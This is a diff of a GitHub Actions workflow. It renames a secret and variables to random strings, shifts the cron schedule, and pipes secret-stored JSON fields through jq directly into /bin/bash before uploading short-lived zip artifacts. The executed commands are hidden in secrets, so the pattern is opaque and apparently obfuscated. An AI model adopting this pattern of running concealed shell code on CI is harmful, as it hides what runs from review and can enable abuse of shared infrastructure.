@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '5 2,8,14,20 * * *'
+    - cron: '58 5,11,17,23 * * *'
 jobs:
   trigger:
     runs-on: ubuntu-latest
@@ -12,17 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          e69513: ${{ secrets.e69513 }}
+          zo560: ${{ secrets.zo560 }}
         run: |
-          printf '%s' "$e69513" | jq -r .odd05 | /bin/bash
-          printf '%s' "$gd417" | jq -r .wc6445 | /bin/bash
-          echo $v332 | jq -r .fn583 | /bin/bash
-          echo $fgtod3 | jq -r .mhpbr99 | /bin/bash
-          echo $p85 | jq -r .gelo003 | /bin/bash
+          printf '%s' "$zo560" | jq -r .zwzn85 | /bin/bash
+          printf '%s' "$mooc7318" | jq -r .tpp553 | /bin/bash
+          echo $wb47 | jq -r .j9 | /bin/bash
+          printf '%s' "$n90191" | jq -r .wy3052 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: RW4r7IMW
+          name: 6PvJ2QVs
           path: "*.zip"
           retention-days: 1
